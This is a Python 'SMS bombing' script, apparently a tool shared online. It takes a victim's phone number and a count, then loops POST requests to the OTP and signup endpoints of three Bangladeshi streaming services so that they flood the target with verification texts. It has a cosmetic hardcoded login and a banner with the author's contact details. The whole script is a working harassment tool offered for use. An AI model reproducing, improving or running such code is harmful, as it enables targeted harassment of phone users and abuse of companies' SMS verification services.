import requests
import sys
import time,os
blue= '\33[94m'
lightblue= '\33[94m'
red= '\33[91m'
white= '\33[97m'
yellow= '\33[93m'
green= '\33[1;32m'
cyan= '\33[0m'
os.system("clear")
def psb(z):

    for e in z + '\n':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.05)

logo=green+str("""

     db    88""Yb 88 Yb  dP    db    88b 88 
  dPYb   88__dP 88  YbdP    dPYb   88Yb88 
 dP__Yb  88"Yb  88   8P    dP__Yb  88 Y88 
dP""""Yb 88  Yb 88  dP    dP""""Yb 88  Y8       
                                 

\33[1;32mSMS BOMBING TOOLS
\33[91m──────────────────────────────────────────────────
\33[93m▸ AUTHOR     : ARIYAN AHMED 
\33[1;32m▸ FACEBOOK   : https://www.facebook.com/Remember.This.Name.ARIYAN
\33[91m▸ Whatapp     : +9660531382117
\33[91m──────────────────────────────────────────────────

""")

print(logo)

usern="Toha"
passwd="Sakib"



inpuser=str(input("•\33[93mEnter Username:-\33[91m"))
inppass=str(input("•\33[91mEnter Password:-\33[93m"))

if usern==inpuser and passwd==inppass:
   psb("\33[1;32m[√] Login Successful SecDet")
   time.sleep(1)
   pass

os.system("clear")
print(logo)
number  = input("•\33[1;32mEnter Your Target Number: ")
amount = int(input("•\33[93mEnter Your Amount: "))


def api1():
   
    url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"
   
    
    data = {
      "requestType": "send",
      "phoneNumber": "+88" + number,
      "emailConsent": "true",
      "whatsappConsent": "true"
    }
    
    
    headers = {
        "Content-Type" : "application/json"
    }
    
    
    response = requests.post(url, json = data, headers = headers).status_code
    
 
    return response


def api2():
    
    url = "https://api.bongo-solutions.com/auth/api/login/send-otp"
    
   
    data = {
        "operator" : "all",
        "msisdn": "88" + number
    }
    
    
    headers = {
        "Content-Type" : "application/json"
    }
    
    
    response = requests.post(url, json = data, headers = headers).status_code
    
  
    return response



def api4():
   
    url ="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
   
    
    data = {
      "requestType": "send",
      "phoneNumber": "+88" + number,
      "emailConsent": "true",
      "whatsappConsent": "true"
    }
    
    
    headers = {
        "Content-Type" : "application/json"
    }
    
    
    response = requests.post(url, json = data, headers = headers).status_code
    
 
    return response

psb("\33[94m\n Ariyan Bombing Started!\n")


done = 0


while True:
    
    code = api1()
    
    
    if (code == 200):
        done += 1
        psb(str(done) + " \33[1;32mSms Sent Successfully!!")
   
    else:
        psb("\33[91mSms Send Failed!")
    
     
    if (done == amount):
        psb("\33[94m\n Ariyan Bombing Finished!")
        break
     
    
    code = api2()
    

    if (code == 200):
        done += 1
        psb(str(done) + " \33[1;32mSms Sent Successfully!!")
    
    else:
        psb("\33[91mSms Send Failed!")
    
    
    if (done == amount):
        psb("\33[94m\n ariyan Bombing Finished!")
        break
    
    
    
    code = api4()
    

    if (code == 200):
        done += 1
        psb(str(done) + " \33[1;32mSms Sent Successfully!!")
    
    else:
        psb("\33[91mSms Send Failed!")
    
    
    if (done == amount):
        psb("\33[94m\n ariyan Bombing Finished!")
        break
    